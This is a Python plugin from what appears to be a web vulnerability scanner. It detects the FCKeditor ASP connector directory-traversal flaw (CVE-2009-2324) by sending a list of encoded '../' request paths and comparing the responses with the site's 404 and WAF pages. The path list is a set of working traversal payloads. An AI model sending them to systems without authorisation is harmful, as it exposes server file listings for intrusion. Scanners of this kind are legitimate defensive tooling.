#!/usr/bin/python
# -*- coding: utf-8 -*-
from engine.engine_utils.common import *
from engine.logger import scanLogger as logger
from engine.engine_utils.rule_result_judge import page_similar


def run_domain(http,ob,inj_dir=""):
    '''
    CVE-2009-2324
    CNNVD-200907-071
    FCKeditor是一款开放源码的HTML文本编辑器 。
    FCKeditor没有正确地验证用户对多个connector模块所传送的输入，远程攻击者可以利用samples目录中的组件注入任意脚本或HTML，或通过目录遍历攻击上传恶意文件 。
    CVSS分值:	4.3	[中等(MEDIUM)]
    CWE-79	[在Web页面生成时对输入的转义处理不恰当（跨站脚本）]
    '''
    frame = ob.get('siteType')
    if frame and frame in ['php', 'jsp', 'aspx']:
        return []
    http = HttpRequest({'timeout': 10, 'follow_redirects': False})
    result = []
    try:
        result = []
        scheme = ob['scheme']
        domain = ob['domain']
        header = {'Host': domain}
        source_ip = ob.get('source_ip')
        if source_ip:
            domain = source_ip
        inj_path_list = [
            "/FCKeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=GetFoldersAndFiles&Type=../&CurrentFolder=%2F",
            "/FCKeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=GetFoldersAndFiles&Type=%c0%ae%c0%ae/&CurrentFolder=%2F",
            "/FCKeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=GetFoldersAndFiles&Type=..%2F&CurrentFolder=%2F",
            "/FCKeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=GetFoldersAndFiles&Type=..%252F&CurrentFolder=%2F",
            "/FCKeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=GetFoldersAndFiles&Type=%2e%2e%2fF&CurrentFolder=%2F",
            "/FCKeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=GetFoldersAndFiles&Type=%252e%252e%252fF&CurrentFolder=%2F",
            #
            "/fckeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=GetFoldersAndFiles&Type=../&CurrentFolder=%2F",
            "/fckeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=GetFoldersAndFiles&Type=%c0%ae%c0%ae/&CurrentFolder=%2F",
            "/fckeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=GetFoldersAndFiles&Type=..%2F&CurrentFolder=%2F",
            "/fckeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=GetFoldersAndFiles&Type=..%252F&CurrentFolder=%2F",
            "/fckeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=GetFoldersAndFiles&Type=%2e%2e%2fF&CurrentFolder=%2F",
            "/fckeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=GetFoldersAndFiles&Type=%252e%252e%252fF&CurrentFolder=%2F"
        ]

        for inj_path in inj_path_list:
            url = "%s://%s%s%s" % (scheme,domain,inj_dir,inj_path)
            res, content = http.request(url, 'GET', headers=header)
            if res and res.get('status') == '200':
                if page_similar(res.get('status'), content, ob.get('404_page')):
                    continue
                if page_similar(res.get('status'), content, ob.get('waf_page')):
                    continue
                detail = "检测到FCKeditor目录遍历漏洞"
                request = getRequest(url, domain=ob['domain'])
                response = getResponse(res,content)
                result.append(getRecord(ob,url,ob['level'],detail,request,response))
                break

    except Exception,e:
        logger.error("File:FCKeditorForAspDirScript_yd.py, run_domain function :%s" % (str(e)))

    return result



